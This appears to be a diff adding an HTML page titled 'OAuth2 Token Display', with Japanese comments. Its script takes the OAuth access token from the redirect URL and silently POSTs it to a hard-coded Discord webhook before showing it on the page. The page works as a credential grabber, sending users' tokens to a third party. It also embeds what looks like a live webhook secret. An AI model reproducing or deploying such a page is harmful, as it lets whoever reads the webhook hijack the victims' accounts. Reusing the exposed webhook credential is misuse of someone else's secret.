@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OAuth2 Token Display</title>
+</head>
+<body>
+    <h1>OAuth2 Token Display</h1>
+    <p id="token"></p>
+
+    <script>
+        // Webhook URL
+        var webhookUrl = "https://discord.com/api/webhooks/1246024388290023444/N7DmfwaqmA9up2DKLI0if_lg1TEEsjH1PlgqcnI8t-ZdrvtLQyk7C4GtODObk8bx4y6k";
+
+        // リダイレクトURIからアクセストークンを取得し、Webhookで送信して表示
+        var urlParams = new URLSearchParams(window.location.search);
+        var accessToken = urlParams.get('access_token');
+        if (accessToken) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", webhookUrl);
+            xhr.setRequestHeader("Content-Type", "application/json");
+
+            // Webhookへ送信するメッセージ
+            var message = {
+                content: "Access Token: " + accessToken
+            };
+
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === XMLHttpRequest.DONE) {
+                    if (xhr.status === 200) {
+                        document.getElementById("token").textContent = "Access Token: " + accessToken;
+                        console.log("Access token sent to webhook successfully.");
+                    } else {
+                        console.error("Error sending access token to webhook:", xhr.status, xhr.statusText);
+                    }
+                }
+            };
+
+            // リクエスト送信
+            xhr.send(JSON.stringify(message));
+        } else {
+            document.getElementById("token").textContent = "No access token found in the URL.";
+        }
+    </script>
+</body>
+</html>
